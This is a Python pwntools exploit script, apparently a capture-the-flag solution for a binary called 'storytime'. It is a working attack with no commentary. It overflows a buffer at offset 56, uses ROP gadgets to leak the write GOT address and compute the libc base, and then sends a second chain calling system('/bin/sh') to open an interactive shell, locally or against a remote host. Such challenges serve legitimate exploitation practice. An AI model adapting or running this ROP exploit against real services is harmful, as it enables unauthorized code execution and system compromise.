#!/usr/bin/python
# Author: Hack.You
from pwn import *
import warnings

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './storytime'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
warnings.filterwarnings("ignore")

io = start()

libc = elf.libc 

offset = 56
pop_rdi = 0x0000000000400703 # pop rdi; ret; 
pop_rsi_r15 = 0x0000000000400701 # pop rsi; pop r15; ret; 
padding = 8 # pop rbp; ret;
ret = 0x000000000040048e # ret;

payload = flat({
    offset: [
        # write(1, elf.got['write'], 8)
        pop_rsi_r15,
        elf.got['write'],
        0x0,
        elf.sym['end']+16,
        b'A' * padding,
        elf.sym['climax']
    ]
})

io.sendline(payload)

# Leak puts libc
io.recvuntil("Tell me a story: \n")
write_got = unpack(io.recv()[:6].ljust(8, b"\x00"))
log.info("Write GOT: %#x", write_got)

# Calculate libc base
libc.address = write_got - libc.symbols['write']
log.info("Libc BASE: %#x", libc.address)

bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
log.info('/bin/sh: %#x', bin_sh)
log.info('System: %#x', system)

payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        ret,
        system,
    ]
})

io.sendline(payload)

io.interactive()
